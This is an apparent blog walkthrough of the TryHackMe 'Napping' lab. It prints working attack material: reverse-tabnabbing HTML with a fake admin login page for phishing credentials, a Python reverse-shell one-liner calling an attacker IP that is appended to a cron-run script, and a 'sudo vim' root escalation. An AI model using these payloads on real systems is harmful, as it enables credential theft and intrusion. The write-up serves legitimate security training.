---
author: "Shebu"
title: "Napping: THM"
date: "2022-03-24"
tags: ["tabnabbing", "vim", "phishing", "misconfiguration"]
cover:
    image: img/napping.png
    # can also paste direct link from external site
    # ex. https://i.ibb.co/K0HVPBd/paper-mod-profilemode.png
    alt: "<alt text>"
    caption: "<text>"
    relative: false # To use relative path for cover image, used in hugo Page-bundles
---

Napping is a medium difficulty box from TryHackMe which had a interesting vulnerability called `Tab Nabbing` to phish the admin of the website to get user daniel's credentials by which we could ssh into the box. We then alter a python file which is run every minute by user adrian to get a reverse shell back as that user. For root, we could execute vim as root . So we refer GTFOBINS for sudo entry for vim binary to elevate our privileges to root.

*[Image: header]*

|  **Room** 	| Napping                                           	|
|:--------------:	|----------------------------------------------------	|
|     **OS**     	| Linux                                              	|
| **Difficulty** 	| Medium                                             	|
|  **Room Link** 	| [https://tryhackme.com/room/nappingis1337](https://tryhackme.com/room/nappingis1337)               	|
|   **Creator**  	| [hadrian3689](https://tryhackme.com/p/hadrian3689) 	|

# Enumeration 
----------------------

## Portscan

```
──(root💀kali)-[~/thm/napping]
└─# rustscan -a 10.10.247.40 -- -sV -sC -oN napping.nmap              
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

Nmap scan report for 10.10.247.40
Host is up, received reset ttl 63 (0.24s latency).
Scanned at 2022-03-23 06:39:55 EDT for 13s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 85:f3:f5:b4:8c:24:1e:ef:6f:28:42:33:7c:2a:22:b4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmgxcZKHEVEbLHxkmo/bjXYP9qMuWYGmbV0Tl/maOUcfyhPcPPcl2S/RzgKgfWR5MBUit4/iD+LBbKvIqv5NsXAMjUFaC35mXLRrEhUXSP4pfcaWGzKARRJ4C9eUHJ1aT/vhU0ZNnhOW1H8Ig+btzcIqeiQJiKH+iGySyTsXJ3qLOAcQ4qwGKfdpnPtN3MYG7Ba6etdN4J+FVm/tjcUxE76ZKv5IdN+iOeTwBhKhk8lTPf6G8S7X2jx38deqAI6j20UBAnlFdfSjVrbavfzoeyAKODpzmgQ0J/VFWIZGqqMxg/Hq6KChT67DTMxrnfN7wojS2/fItjIpsvjTxlxhiHSvi+57ngJlPYKbiqU4P1nbxSB+eyy0UK44ln6MbLpCcRkvwOP87VOvfII4TfXostq94fYRW8G7oszKGFrucQdYoVTFhKgYveKe0np4eGG/GdPefDbLp5VoNTjs7WBDSxn5jY+0A/IY1/EjuaGlQvpk5IxDbU/mYm9bPeSYdAWgk=
|   256 c2:7b:a9:0c:28:7c:d1:cd:03:23:f4:a8:bc:02:72:4b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBP4j+pg12EElUiOMAVpEuqFCympfDuyyZ7McBGxU9lCp4qMOGKShc96y4656MSnAZu7ofMx9DyO1sDwcfbI3MQ=
|   256 fe:92:00:b4:ee:5e:5a:92:52:90:9f:5e:0b:fd:61:a3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ0X6D1WGTnXedsm4aFXKIEt6iY22msqmq2QvKPW3VXM
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.06 seconds
```

So there are 2 ports running

-> `22` - `OpenSSH 8.2p1`

-> `80`- `Apache httpd 2.4.41`

## Website: port 80

The webpage had just a simple login & sign up page.

login page: 
*[Image: website1]*

signup page: 
*[Image: website2]*

I tried default credentials, basic sql injection but those didn't work so I quickly went on to create an account & logged into the site.

We were greeted with a `welcome.php` page where we could submit a blog link & as the site says the blog link which we submitted will be reviewed by the admin. 

*[Image: website3]*

When I entered my website link ,it is displayed back for us to review it. 

*[Image: website4]*

Once clicked it will open the link we submitted in a new tab.

*[Image: website5]*

## Directory bruteforce

```bash
┌──(root💀kali)-[~/thm/napping]
└─# feroxbuster -u http://10.10.247.40/ -w /usr/share/wordlists/dirb/common.txt -x php -C 403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.247.40/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💢  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      312c http://10.10.247.40/admin => http://10.10.247.40/admin/
200      GET        1l        0w        1c http://10.10.247.40/config.php
200      GET        0l        0w        0c http://10.10.247.40/admin/config.php
200      GET       38l       82w     1211c http://10.10.247.40/index.php
302      GET        0l        0w        0c http://10.10.247.40/logout.php => index.php
200      GET       38l       76w     1158c http://10.10.247.40/admin/login.php
302      GET        0l        0w        0c http://10.10.247.40/admin/logout.php => login.php
200      GET       42l      104w     1567c http://10.10.247.40/register.php
302      GET        0l        0w        0c http://10.10.247.40/welcome.php => index.php
302      GET        0l        0w        0c http://10.10.247.40/admin/welcome.php => login.php
[####################] - 49s    18452/18452   0s      found:10      errors:0                          
```

So we have some interesting directories `/admin` & `/admin/login.php` 

The /admin directory showed 403 but we were able to access the admin login page which is at `/admin/login.php`

forbidden page: 
*[Image: website6]*

admin login page -
*[Image: website7]*

# Shell as daniel

## Tab Nabbing

After this I was stuck for a while then I decided to google the name of the room like: "napping exploit" & then I got many results which was about  **Tab nabbing**: a web vulnerability which may cause a phishing attack .

> TAB NABBING:
    Reverse tabnabbing, or simply tabnabbing, is a `phishing attack` in which an attacker fools a victim into entering their credentials on a fake website controlled by the attacker
>
>   Reverse tabnabbing attacks are possible on websites that enable users to post links that, when clicked, open in a new tab. The link is opened in a new tab because of the link’s `target="_blank" property`.
>
>   A regular way to abuse this behaviour would be to change the location of `window.opener.location = https://attacker.com/victim.html` to a web controlled by the attacker that looks like the original one, so it can imitate the login form of the original website and ask for credentials to the user.

You could read more on how to exploit it here -> [Hacktricks](https://book.hacktricks.xyz/pentesting-web/reverse-tab-nabbing)

**So the idea here is by using Tab Nabbing we could post a malicious link pointing to a fake admin login page of the website from our end, assuming that when the admin clicks on our link, he will get redirected to a new tab which has the fake admin login page of ours and enter his credentials thinking that he had accidentally logged out .**

##### Steps 

- Create a file called `malicious.html` with the following contents

```html
<!DOCTYPE html>
<html>
 <body>
  <script>
  window.opener.location = "http://<attacker-ip>:8000/phishing.html";
  </script>
 </body>
</html>
```

This will redirect the user who clicks it to the phishing.html page in a new tab.

- Copy the source code of admin login page and save it as `phishing.html` which will trick the admin to enter his credentials.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
		<h2>Admin Login</h2>
		<p>Please fill in your credentials to login.</p>
		<form action="/admin/login.php" method="post">
		    <div class="form-group">
			<label>Username</label>
			<input type="text" name="username" class="form-control " value="">
			<span class="invalid-feedback"></span>
		    </div>    
		    <div class="form-group">
			<label>Password</label>
			<input type="password" name="password" class="form-control ">
                <span class="invalid-feedback"></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <br>
        </form>
    </div>
</body>
```

- Serve those files by spinning up a web server: `python3 -m http.server 8000`

- Submit the link `http://<attacker-ip>:8000/malicious.html` in the website.

- Run wireshark to capture tun0 packets

Now all we have to do is to wait for 2-3 mins for the admin to fall in our trap! kekw 

After few mins I got requests from the server for both of the fake html pages I created which essentially means the admin did visit our fake login page!

```
┌──(root💀kali)-[~/thm/napping]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.194.37 - - [24/Mar/2022 04:13:54] "GET /malicious.html HTTP/1.1" 200 -
10.10.194.37 - - [24/Mar/2022 04:13:54] "GET /phishing.html HTTP/1.1" 200 -
10.10.194.37 - - [24/Mar/2022 04:13:55] code 501, message Unsupported method ('POST')

```
Interesting thing to see here is that there is a **POST** request sent back to us. Lets check wireshark for more information about that .

*[Image: website8]*

**Right click on the POST request** and select **Follow** -> **TCP stream**

*[Image: website9]*

Yay  we got a username called `daniel` & his password.

Using the credentials I was able to SSH in to machine as daniel .

```
┌──(root💀kali)-[~/thm/napping]
└─# ssh daniel@10.10.194.37
The authenticity of host '10.10.194.37 (10.10.194.37)' can't be established.
ED25519 key fingerprint is SHA256:JofRko6/RC6xnBRFyh6aSMX+ospLetfcod6d05kXQQU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.194.37' (ED25519) to the list of known hosts.
daniel@10.10.194.37's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 24 Mar 2022 05:50:13 AM UTC

  System load:  0.0               Processes:             113
  Usage of /:   56.9% of 8.90GB   Users logged in:       0
  Memory usage: 60%               IPv4 address for eth0: 10.10.194.37
  Swap usage:   0%
10 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Mar 16 00:41:48 2022 from 10.0.2.26

daniel@napping:~$ id
uid=1001(daniel) gid=1001(daniel) groups=1001(daniel),1002(administrators)
```
We are a part of `administrators` group 

There are 3 users on the machine `root`, `daniel` & `adrian`

# Shell as adrian

```
daniel@napping:/home/adrian$ cat /etc/passwd | grep bash

root:x:0:0:root:/root:/bin/bash
adrian:x:1000:1000:adrian:/home/adrian:/bin/bash
daniel:x:1001:1001::/home/daniel:/bin/bash
```

We need to escalate our privileges to adrian to get the user flag.

Poking around the machine I found `config.php` at `/var/www/html` which had username & a password

```php
daniel@napping:/var/www/html$ cat config.php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'adrian');
define('DB_PASSWORD', 'Stop@Napping3!');
define('DB_NAME', 'website');
.
.
.
```
With the help of these credentials I was able to login to mysql@localhost but found nothing quite interesting there.

Visiting the home dir of adrian,

```
daniel@napping:/home/adrian$ ls -al
total 44
drwxr-xr-x 4 adrian adrian         4096 Mar 24 06:00 .
drwxr-xr-x 4 root   root           4096 Mar 15 23:28 ..
lrwxrwxrwx 1 root   root              9 Mar 16 00:39 .bash_history -> /dev/null
-rw-r--r-- 1 adrian adrian          220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 adrian adrian         3771 Feb 25  2020 .bashrc
drwx------ 2 adrian adrian         4096 Mar 15 23:28 .cache
lrwxrwxrwx 1 root   root              9 Mar 16 00:40 .mysql_history -> /dev/null
-rw-r--r-- 1 adrian adrian          807 Feb 25  2020 .profile
-rw-rw-r-- 1 adrian administrators  480 Mar 16 00:02 query.py
-rw-rw-r-- 1 adrian adrian           75 Mar 16 00:38 .selected_editor
-rw-rw-r-- 1 adrian adrian          224 Mar 24 06:06 site_status.txt
drwx------ 2 adrian adrian         4096 Mar 15 23:27 .ssh
-rw-r--r-- 1 adrian adrian            0 Mar 15 23:28 .sudo_as_admin_successful
-rw-r----- 1 root   adrian           56 Mar 16 00:33 user.txt
-rw------- 1 adrian adrian            0 Mar 16 00:40 .viminfo
```

We have the user.txt her. We can view and edit the `query.py` file since we are a part of administrators group.

*osquery.py*
```python
from datetime import datetime
import requests

now = datetime.now()

r = requests.get('http://127.0.0.1/')
if r.status_code == 200:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Site is Up: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
else:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Check Out Site: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
```

The `site_status.txt` file hints that this script might be running in the background every  minute. 

*site_status.txt*
```
daniel@napping:/home/adrian$ cat site_status.txt
Site is Up: 24/03/2022 06:31:01
Site is Up: 24/03/2022 06:32:02
Site is Up: 24/03/2022 06:33:01
Site is Up: 24/03/2022 06:34:02
Site is Up: 24/03/2022 06:35:01
Site is Up: 24/03/2022 06:36:02
Site is Up: 24/03/2022 06:37:01
Site is Up: 24/03/2022 06:38:02
Site is Up: 24/03/2022 06:39:01
```

Lets add a python reverse shell oneliner at the end of the **osquery.py** script.

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
```
## user.txt 🚩

After a minute we got a reverse shell back as **adrian**. Go ahead and grab the `user.txt` 🚩

```
┌──(root💀kali)-[/opt/peas]
└─# nc -lvnp 9001                                                                  127 ⨯
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001

Ncat: Connection from 10.10.35.41.
Ncat: Connection from 10.10.35.41:46982.

adrian@napping:~$ id
uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),1002(administrators)

adrian@napping:~$ cat user.txt
THM{Wh@T_1S_*******PriViL36E}
```

# Shell as root

Running `sudo -l` reveals that we could run `vim` as root.

```
adrian@napping:~$ sudo -l

Matching Defaults entries for adrian on napping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User adrian may run the following commands on napping:
    (root) NOPASSWD: /usr/bin/vim
```
## root.txt 🚩

We refer [GTFOBINS](https://gtfobins.github.io/gtfobins/vim/#shell) to check sudo entry for vim.

Run `sudo /usr/bin/vim -c ':!/bin/sh'` to obtain root shell .
Grab the `root.txt` flag 🎉

```
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
THM{Adm1n$__******tsk_tSK}
```
